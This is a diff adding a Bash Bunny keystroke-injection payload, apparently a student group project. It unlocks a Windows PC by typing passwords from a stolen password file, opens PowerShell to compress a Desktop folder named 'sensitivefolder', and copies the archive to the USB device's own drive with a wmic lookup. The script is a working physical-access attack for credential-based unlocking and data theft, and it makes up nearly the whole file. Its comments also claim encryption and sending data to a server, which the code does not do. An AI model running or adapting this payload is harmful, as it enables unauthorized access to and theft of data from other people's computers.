@@ -1,0 +1,71 @@
+# Bash Bunny Attack:
+# Unlock Windows PC with stolen password
+# in the password file
+
+# Written by:
+# - Prince Samuel Kyeremanteng
+# - Hadar Eklund
+# - Group 24.
+
+ATTACKMODE HID STORAGE
+
+# Mount storage to access loot folder
+mount /dev/nandf /root/udisk/
+
+# ATTACK ONE: Give some time before attack
+QUACK DELAY 3000
+
+# ATTACK ONE: Try to unlock Windows in 5 attempts.
+count=0
+sed 's/\r$//' /root/udisk/loot/password.txt | while read -r word; do
+    if [ $count -ge 5 ]; then break; fi  # Limit to 5 attempts
+    # Type the password
+    STRING "$word"
+    # Press Enter
+    ENTER
+    # Wait 2 seconds
+    sleep 2
+    count=$((count+1))
+done
+
+
+# wait for 2 seconds before the next attacks
+sleep 2
+
+# ATTACK THREE: Look for sensitive folder and encrypt
+QUACK GUI s
+QUACK STRING sensitivefolder
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK FN ALT F4
+
+# ATTACK FOUR: zip a sensitive file and send it to a server
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING cd Desktop
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING ls
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING Compress-Archive -Path "H:\Desktop\sensitivefolder" -DestinationPath "H:\Desktop\sensitivefolder.zip"
+# QUACK STRING Compress-Archive -Path sensitivefolder -DestinationPath sensitivefolder.zip
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK FN ALT F4  # Close PowerShell
+QUACK DELAY 500
+QUACK GUI r
+QUACK STRING cmd
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING for /f "tokens=2 delims==" %d in ('wmic logicaldisk where volumename^="BashBunny" get deviceid /value ^| find "DeviceID="') do copy "H:\Desktop\sensitivefolder.zip" "%d\"
+QUACK ENTER
+
